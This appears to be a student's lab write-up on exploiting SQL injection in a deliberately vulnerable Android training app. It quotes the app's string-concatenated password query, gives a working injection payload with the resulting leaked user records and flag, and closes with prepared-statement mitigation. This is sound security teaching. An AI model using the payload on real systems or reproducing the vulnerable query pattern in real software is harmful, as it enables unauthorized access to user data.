# Adroid Access Control (via sql injection)

### Steps


1. Download and install the app from the resources.
   - `adb install InputValidationApp.apk`
        - app requires api level minSdkVersion 27, so I had to use a different emulator 
            - Alternativly, I could have changed the sdk version and try to recompile it (starting with: `adb d InputValidationApp.apk`, change sdk version, recompile it etc.)

2. Perform an sql injection attack
    - analyze source code with `jadx-gui` (open the apk file). 
    - relevant Code: "this.mDB.rawQuery("SELECT * FROM sqliuser WHERE password = '" + this.binding.insertPassword.getText().toString() + "'", null);"

Attack string (as pw): `' OR 1=1; -- comment`
    - "'" to jump out of the context
    - "OR 1=1" to always make the condition true
    - "-- comment" -> to make it a valid sql query as the java code appends a "'"

**Result screen** 
admin: 123456       1234567812345678
student: p@sdfkjs   1111222233334444
banker:  JKfv!378   {SQL_injection_flag}
 




## Mitigate the problem

1. Explain the security problem
    - it is possible that user input is interpreted/executed as sql
2. Explain the exploit
    - see step 2
3. Explain mitigation (how this can be fixed)
    - Do not allow user input to be run as code. 
    - Use a "Prepared statement" (java jargon, in other languages its called differently, e.g: "prameterized query")
    - see 


danielknoepfel@hotmail.com
